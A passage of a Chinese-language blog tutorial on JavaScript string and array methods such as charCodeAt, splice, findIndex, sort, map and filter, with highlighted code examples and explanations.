4</span></span><br><span class="line"><span class="string">&#x27;0123456&#x27;</span>.<span class="title function_">charAt</span>(<span class="number">10</span>) <span class="comment">// &#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="charCodeAt"><a href="#charCodeAt" class="headerlink" title="charCodeAt"></a>charCodeAt</h4><p>函数：String.charCodeAt(index)</p><p>功能：返回 指定位置 字符 在 Unicode字符集上对应 码点的 十进制值（相当于下面String.fromCharCode() 的逆操作！）。这个返回值是 0 - 65535 之间的整数。如果参数 index 不在 0 与 string.length 之间，该方法将返回NaN。</p><p>注意，charCodeAt 方法返回的 Unicode 码点不会大于 65536（0xFFFF），也就是说，只返回两个字节的字符的码点。如果遇到码点大于 65536 的字符（四个字节的字符），必需连续使用两次 charCodeAt，不仅读入charCodeAt(i)，还要读入 charCodeAt(i+1)，将两个值放在一起，才能得到准确的字符。</p><h5 id="拓展：或者直接使用codePointAt-，codePointAt-可以-返回-大于-0xFFFF-65535-的-Unicode-值的完整值。"><a href="#拓展：或者直接使用codePointAt-，codePointAt-可以-返回-大于-0xFFFF-65535-的-Unicode-值的完整值。" class="headerlink" title="拓展：或者直接使用codePointAt() ，codePointAt() 可以 返回 大于 0xFFFF (65535) 的 Unicode 值的完整值。"></a>拓展：或者直接使用codePointAt() ，codePointAt() 可以 返回 大于 0xFFFF (65535) 的 Unicode 值的完整值。</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;0123456&#x27;</span>.<span class="title function_">charCodeAt</span>(<span class="number">4</span>) <span class="comment">// 52&#x27;0123456&#x27;.charCodeAt(-1) // NaN</span></span><br><span class="line"><span class="string">&#x27;0123456&#x27;</span>.<span class="title function_">charCodeAt</span>(<span class="number">10</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure><h4 id="fromCharCode"><a href="#fromCharCode" class="headerlink" title="fromCharCode"></a>fromCharCode</h4><p>函数：String.fromCharCode(n1, n2, …, nX)</p><p>功能：可接受一个指定的 Unicode 值，然后返回一个字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">72</span>,<span class="number">69</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">79</span>);<span class="comment">//HELLO</span></span><br></pre></td></tr></table></figure><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>函数：String.replace(searchValue, replaceValue)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;bone, alone, phone&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;one&#x27;</span>, <span class="number">1</span>) <span class="comment">// b1, alone, phone</span></span><br><span class="line"><span class="string">&#x27;bone, alone, phone&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/one/g</span>, <span class="number">1</span>) <span class="comment">// b1, al1, ph1</span></span><br></pre></td></tr></table></figure><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h4><p>函数：String.trim()</p><p>功能：去除字符串首尾空格</p><p>trim在ES5已定义，且大多数浏览器已支持，不再需要自己实现。详见：trim on MDN</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;hello&#x27;</span>.<span class="title function_">trim</span>() <span class="comment">// &#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="字符串操作-其它方法"><a href="#字符串操作-其它方法" class="headerlink" title="字符串操作 其它方法"></a>字符串操作 其它方法</h3><h4 id="strartsWith-endsWith"><a href="#strartsWith-endsWith" class="headerlink" title="strartsWith&#x2F;endsWith"></a>strartsWith&#x2F;endsWith</h4><p>函数：String.strartsWith()&#x2F;String.endsWith()。功能：判断 字符串首、尾是否以 目标子字符串 开头、结尾。返回boolean值。</p><h4 id="toUpperCase-toLowerCase"><a href="#toUpperCase-toLowerCase" class="headerlink" title="toUpperCase&#x2F;toLowerCase"></a>toUpperCase&#x2F;toLowerCase</h4><p>函数：String.toUpperCase()&#x2F;String.toLowerCase()。功能：字母转大、小写。</p><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>通过对 string[索引] 赋值方式，并不能改变 目标string，只能对 新变量 并进行赋值才能改变。要与数组操作区分开！！！</p><h2 id="二、数组操作"><a href="#二、数组操作" class="headerlink" title="二、数组操作"></a>二、数组操作</h2><h3 id="数组整体-操作"><a href="#数组整体-操作" class="headerlink" title="数组整体 操作"></a>数组整体 操作</h3><h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p>函数：Array.join(?separator)</p><p>功能：通过指定的分隔符将数组项连接合并为一个字符串，参数不传则默认为”,”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;bmp&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;ico&#x27;</span>, <span class="string">&#x27;png&#x27;</span>]</span><br><span class="line"><span class="keyword">let</span> str = arr.<span class="title function_">join</span>(<span class="string">&#x27;|&#x27;</span>) <span class="comment">// jpg|bmp|gif|ico|png</span></span><br></pre></td></tr></table></figure><h4 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h4><p>功能：将函数项颠倒顺序，会改变 原数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ary = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">ary.<span class="title function_">reverse</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary) <span class="comment">// [3,2,1]</span></span><br></pre></td></tr></table></figure><h4 id="concat-1"><a href="#concat-1" class="headerlink" title="concat"></a>concat</h4><p>功能：将多个数组合并，不改变原数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ary = [<span class="string">&#x27;cat&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> newary = ary.<span class="title function_">concat</span>([<span class="string">&#x27;hat&#x27;</span>], [<span class="string">&#x27;bat&#x27;</span>, <span class="string">&#x27;fat&#x27;</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newary) <span class="comment">// [&quot;cat&quot;, &quot;hat&quot;, &quot;bat&quot;, &quot;fat&quot;]</span></span><br></pre></td></tr></table></figure><h3 id="数组项-操作"><a href="#数组项-操作" class="headerlink" title="数组项 操作"></a>数组项 操作</h3><p>（3种 查找 数组元素的方法：includes、indexOf&#x2F;lastIndexOf、Array.find&#x2F;Array.findIndex。前2种也适用于 查找字符串！！）</p><h4 id="includes"><a href="#includes" class="headerlink" title="includes"></a>includes</h4><p>用处：判断 数组 是否包含 指定的元素。或者 字符串 是否包含指定的 子字符串。返回boolean值</p><h4 id="indexOf-lastIndexOf"><a href="#indexOf-lastIndexOf" class="headerlink" title="indexOf, lastIndexOf"></a>indexOf, lastIndexOf</h4><p>功能：indexOf（searchElement, position），searchElement为需要查找的元素，position为开始查找的位置。</p><p>从前往后查找满足条件的 第一项索引，找到了就返回该索引，找不到 返回-1。lastIndexOf相反。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ary = [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;hat&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;fat&quot;</span>]</span><br><span class="line"><span class="keyword">const</span> index = ary.<span class="title function_">indexOf</span>(<span class="string">&#x27;cat&#x27;</span>) <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">const</span> lastIndex = ary.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;cat&#x27;</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h4 id="Array-find"><a href="#Array-find" class="headerlink" title="Array.find"></a>Array.find</h4><p>遍历数组中的元素，找到满足条件的元素，就返回 第一个 满足该条件元素的 值；找不到，就返回undefined。</p><p>有3个参数。item：每一次迭代查找的数组元素。index：每一次迭代查找的数组元素索引。array：被查找的数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">12</span>];</span><br><span class="line"><span class="keyword">var</span> res = arr.<span class="title function_">find</span>(<span class="function">(<span class="params">item, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item &gt; <span class="number">4</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);<span class="comment">//6 数组中 大于4的 第一个元素 是6 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = arr.<span class="title function_">find</span>(<span class="function">(<span class="params">item, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item &gt; <span class="number">14</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);<span class="comment">//undefined 数组中 不包含 大于14的元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = arr.<span class="title function_">find</span>(<span class="function">(<span class="params">item, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item == <span class="number">6</span>;<span class="comment">//【判断 数组中是否包含 某元素！】</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);<span class="comment">//6  数组中 包含 值为6 的元素</span></span><br></pre></td></tr></table></figure><h4 id="Array-findIndex"><a href="#Array-findIndex" class="headerlink" title="Array.findIndex"></a>Array.findIndex</h4><p>遍历数组中的元素，找到满足条件的元素，就返回 第一个 满足该条件元素的 索引；找不到，就返回-1。三个参数同上！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">12</span>];</span><br><span class="line"><span class="keyword">var</span> res = arr.<span class="title function_">findIndex</span>(<span class="function">(<span class="params">item, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item &gt; <span class="number">4</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);<span class="comment">//2 数组中 大于4的 第一个元素的 索引 是5 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = arr.<span class="title function_">findIndex</span>(<span class="function">(<span class="params">item, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item &gt; <span class="number">14</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);<span class="comment">//-1 数组中 不包含 大于14的元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = arr.<span class="title function_">findIndex</span>(<span class="function">(<span class="params">item, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item == <span class="number">6</span>;<span class="comment">//【判断 数组中是否包含 某元素！】</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);<span class="comment">//2  数组中 包含 值为6 的元素，其 索引 是2</span></span><br></pre></td></tr></table></figure><h5 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h5><p>findIndex 与 indexOf 的主要区别在于 findIndex 接受回调作为参数，而 indexOf 接受值作为参数。</p><p>这意味着 indexOf 只会在数组中查找值，而 findIndex 将让你 决定如何查找索引。</p><p>查找数组中是否存在 某元素，是使用 findIndex 还是 indexOf ？？？？</p><p>若要查找的数组元素是 基本类型，两种方法没有区别。</p><p><img src="/posts/zi-fu-chuan-yu-shu-zu/1.webp" alt="基本类型-两种方法 没有区别"></p><h5 id="若要查找-数组中-对象-的索引，会有什么差别吗？？？"><a href="#若要查找-数组中-对象-的索引，会有什么差别吗？？？" class="headerlink" title="若要查找 数组中 对象 的索引，会有什么差别吗？？？"></a>若要查找 数组中 对象 的索引，会有什么差别吗？？？</h5><p><img src="/posts/zi-fu-chuan-yu-shu-zu/1-0.webp" alt="对象-两种方法 有区别"></p><p><img src="/1-2webp" alt="对象-两种方法 有区别"></p><p>正如在 indexOf 中看到的那样，即使我们提供了一个相同的对象，但没有指向同一个引用，它也无法在数组中找到它。</p><p>使用 findIndex 允许我们检查数组中每个对象的属性、键和值，因此它可以在数组中找到正确的项目并返回索引。</p><p>最后，因为我们把引用传递给最后一个 indexOf 方法，它可以在数组中找到正确的项，因为引用相等。</p><h5 id="结论：如果你正在搜索更复杂的值（例如对象），请使用Array-prototype-findIndex-以便你可以通过搜索每个对象的键、值和属性来找到正确的索引。"><a href="#结论：如果你正在搜索更复杂的值（例如对象），请使用Array-prototype-findIndex-以便你可以通过搜索每个对象的键、值和属性来找到正确的索引。" class="headerlink" title="结论：如果你正在搜索更复杂的值（例如对象），请使用Array.prototype.findIndex 以便你可以通过搜索每个对象的键、值和属性来找到正确的索引。"></a>结论：如果你正在搜索更复杂的值（例如对象），请使用Array.prototype.findIndex 以便你可以通过搜索每个对象的键、值和属性来找到正确的索引。</h5><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>功能：数组尾部插入一个项，会改变原数组。返回值为插入后的 数组长度。</p><p>const ary &#x3D; [‘head’, ‘tail’]<br>const length &#x3D; ary.push(‘hello’)<br>console.log(ary) &#x2F;&#x2F; [‘head’, ‘tail’, ‘hello’]console.log(length) &#x2F;&#x2F; 3</p><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>功能：数组尾部移除一个项，会改变原数组。返回值为移除的项。</p><p>const ary &#x3D; [‘head’, ‘tail’]<br>const item &#x3D; ary.pop()<br>console.log(ary) &#x2F;&#x2F; [‘head’]<br>console.log(item) &#x2F;&#x2F; ‘tail’</p><h4 id="unshift"><a href="#unshift" class="headerlink" title="unshift"></a>unshift</h4><p>功能：数组头部插入一个项，会改变原数组。返回值为插入后的 数组长度。</p><p>const ary &#x3D; [‘head’, ‘tail’]<br>const length &#x3D; ary.unshift(‘hello’)<br>console.log(ary) &#x2F;&#x2F; [‘hello’，’head’, ‘tail’]<br>console.log(length) &#x2F;&#x2F; 3</p><h4 id="shift"><a href="#shift" class="headerlink" title="shift"></a>shift</h4><p>功能：数组头部移除一个项，会改变原数组。返回值为移除的项。</p><p>const ary &#x3D; [‘head’, ‘tail’]<br>const item &#x3D; ary.shift()<br>console.log(ary) &#x2F;&#x2F; [‘tail’]<br>console.log(item) &#x2F;&#x2F; ‘head’</p><h4 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h4><p>函数：Array.slice(?start, ?end)</p><p>功能：数组项的截取，返回一个 新数组。不改变 原数组！！！！！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ary1 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>].<span class="title function_">slice</span>() <span class="comment">// [0,1,2,3,4,5]</span></span><br><span class="line"><span class="keyword">const</span> ary2 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>].<span class="title function_">slice</span>(<span class="number">3</span>) <span class="comment">// [3,4,5]</span></span><br><span class="line"><span class="keyword">const</span> ary3 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>].<span class="title function_">slice</span>(<span class="number">3</span>, <span class="number">5</span>) <span class="comment">// [3,4]</span></span><br><span class="line"><span class="keyword">const</span> ary4 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>].<span class="title function_">slice</span>(<span class="number">3</span>, -<span class="number">1</span>) <span class="comment">// [3,4]| * end = -1 + 6 = 5， 倒数第一项</span></span><br><span class="line"><span class="keyword">const</span> ary5 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>].<span class="title function_">slice</span>(-<span class="number">2</span>, -<span class="number">1</span>) <span class="comment">// [4]</span></span><br></pre></td></tr></table></figure><h4 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h4><p>函数：Array.splice(start, ?deleteCount, …items)</p><p>功能：可以对数组进行添加删除，间接实现替换功能。会改变原数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ary = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="keyword">let</span> res = ary.<span class="title function_">splice</span>(<span class="number">2</span>) <span class="comment">// 从2的位置起，向后删除所有项</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary, res) <span class="comment">// ary = [0, 1], res = [2, 3, 4, 5]</span></span><br><span class="line"></span><br><span class="line">ary = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">res = ary.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">1</span>) <span class="comment">// 从2的位置起，删除1个项</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary, res) <span class="comment">// ary = [0, 1, 3, 4, 5], res = [2]</span></span><br><span class="line"></span><br><span class="line">ary = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">res = ary.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">3</span>) <span class="comment">// 从2的位置起，删除3个项</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary, res) <span class="comment">// ary = [0, 1, 5], res = [2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">ary = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">res = ary.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="string">&#x27;hello&#x27;</span>) <span class="comment">// 从2的位置起，删除1个项, 同时在2的位置添加一个项（间接实现替换功能）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary, res) <span class="comment">// ary = [0, 1, &#x27;hello&#x27;, 3, 4, 5], res = [2]</span></span><br><span class="line"></span><br><span class="line">ary = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">res = ary.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;hello&#x27;</span>) <span class="comment">// 从2的位置起，删除3个项, 同时在2的位置添加一个项</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary, res) <span class="comment">// ary = [0, 1, &#x27;hello&#x27;, 5], res = [2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">ary = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">res = ary.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>) <span class="comment">// 从2的位置起，删除1个项, 同时在2的位置依次添加多个项</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary, res) <span class="comment">// ary = [0, 1, &#x27;hello&#x27;, &#x27;world&#x27;, 3, 4, 5], res = [2]</span></span><br><span class="line"></span><br><span class="line">ary = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">res = ary.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>) <span class="comment">// 从2的位置起，删除3个项, 同时在2的位置依次添加多个项</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary, res) <span class="comment">// ary = [0, 1, &#x27;hello&#x27;, &#x27;world&#x27;, 5], res = [2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">ary = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">res = ary.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">0</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>) <span class="comment">// 从2的位置起，删除0个项, 同时在2的位置依次添加多个项【索引2的位置被 替换元素占用。之前索引2、及之后的元素，整体后移】</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary, res) <span class="comment">// ary = [0, 1, &quot;hello&quot;, &quot;world&quot;, 2, 3, 4, 5], res = []</span></span><br></pre></td></tr></table></figure><h3 id="迭代操作"><a href="#迭代操作" class="headerlink" title="迭代操作"></a>迭代操作</h3><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>功能：默认 按照数组项的字符的unicode排序，如果不是字符串，调用toString转为字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ary = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">3</span>]</span><br><span class="line">ary.<span class="title function_">sort</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ary) <span class="comment">// [1, 10, 2, 3]| * 10转成字符串&#x27;10&#x27;</span></span><br></pre></td></tr></table></figure><p>用法：数字的升、降序 [只适用于 数字间，不适用ascii比大小]</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 升序</span></span><br><span class="line"><span class="keyword">const</span> aryUp = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">3</span>]</span><br><span class="line">aryUp.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;<span class="comment">//a在前，b在后</span></span><br><span class="line">    <span class="keyword">return</span> a-b;<span class="comment">// 满足a-b&gt;0,即a&gt;b时，a,b值交换位置。换位置后a小b大，达到 升序</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(aryUp); <span class="comment">// [1, 2, 3, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 降序</span></span><br><span class="line"><span class="keyword">const</span> aryDown = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">3</span>]</span><br><span class="line">aryDown.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;<span class="comment">//a在前，b在后</span></span><br><span class="line">    <span class="keyword">return</span> b-a;<span class="comment">// 满足b-a&gt;0,即b&gt;a时，a,b值交换位置。换位置后a大b小，达到 降序</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(aryDown); <span class="comment">// [10, 3, 2, 1]</span></span><br></pre></td></tr></table></figure><h4 id="for…in…"><a href="#for…in…" class="headerlink" title="for…in…"></a>for…in…</h4><h5 id="for-var-index-in-Array"><a href="#for-var-index-in-Array" class="headerlink" title="for(var index in Array)"></a>for(var index in Array)</h5><p>index 为Array中的 索引。【访问 数组元素 使用array[index]】</p><p>补充：数组作为一个对象，为避免遍历其原型链上的 一些共有属性。可能会需要Reflect.ownKeys(arr)或Object.getOwnPropertyNames(arr)。返回所有自有属性key，不管是否可枚举，但不包括 继承自原型的属性。</p><h5 id="for-var-key-in-Object"><a href="#for-var-key-in-Object" class="headerlink" title="for(var key in Object)"></a>for(var key in Object)</h5><p>index 为Object中的 key【访问 对象的值 使用object[key]，其中key是string类型；遍历对象的可枚举属性，包括自有属性、继承自原型的属性】</p><h4 id="for…of…"><a href="#for…of…" class="headerlink" title="for…of…"></a>for…of…</h4><p>for(var item of Array&#x2F;String&#x2F;map&#x2F;set等拥有迭代器对象的集合，不能遍历 对象)<br>item 为Array中的 元素，或String中的 字符。</p><h4 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h4><p>功能：数组遍历,没有返回值。无法响应break、continue和return语句，直至遍历结束。</p><p>[‘a’, ‘b’, ‘c’].forEach(function(item, index, array) {<br>    console.log(item, index, array)<br>    &#x2F;&#x2F; a 0 [‘a’, ‘b’, ‘c’];<br>    &#x2F;&#x2F; b 1 [‘a’, ‘b’, ‘c’];<br>    &#x2F;&#x2F; c 2 [‘a’, ‘b’, ‘c’];<br>})</p><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>功能：遍历数组各项，并 返回一个 新数组【数组被处理后，数组长度 不变，但元素本身 可能发生改变】</p><p>const ary &#x3D; [‘a’, ‘b’, ‘c’].map(function(item, index, ary) {<br>  return item.charCodeAt(0)<br>})<br>console.log(ary) &#x2F;&#x2F; [97, 98, 99]</p><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>功能：遍历数组各项，根据判断条件，过滤出（返回）符合条件的元素 所组成的数组【元素个数 可能少于原数组，但 不改变元素本身】</p><p>const ary &#x3D; [1, 2, 3, 10, 21].filter(function(item, index, ary) {<br>  return item &lt; 10<br>})<br>console.log(ary) &#x2F;&#x2F; [1, 2, 3]</p><h4 id="filter-与-map的简单比较："><a href="#filter-与-map的简单比较：" class="headerlink" title="filter 与 map的简单比较："></a>filter 与 map的简单比较：</h4><p><img src="/posts/zi-fu-chuan-yu-shu-zu/filter%E4%B8%8Emap.webp" alt="filter与map的简单比较"></p><h4 id="every-some"><a href="#every-some" class="headerlink" title="every, some"></a>every, some</h4><p>功能：</p><p>（注意：[].every(ele &#x3D;&gt; {return ele})，整体返回true）</p><p>对于一个 []，在 [] 中,没有任何元素 违反了 判断条件，因此 .every() 方法会直接返回 true。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">21</span>].<span class="title function_">every</span>(<span class="keyword">function</span>(<span class="params">item, index, ary</span>) &#123;</span><br><span class="line"> <span class="keyword">return</span> item &lt; <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">res = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>, <span 